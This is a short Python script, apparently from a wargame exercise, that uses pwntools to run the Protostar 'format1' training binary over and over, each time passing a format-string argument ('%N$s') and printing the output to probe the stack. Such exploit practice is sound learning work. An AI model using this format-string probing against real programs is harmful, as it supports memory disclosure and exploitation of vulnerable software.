from pwn import *
i = 1
while True:
    p = process(['../protostar/format1', '%' + str(i) + '$s'])
    print(p.recvall())
    i += 1
    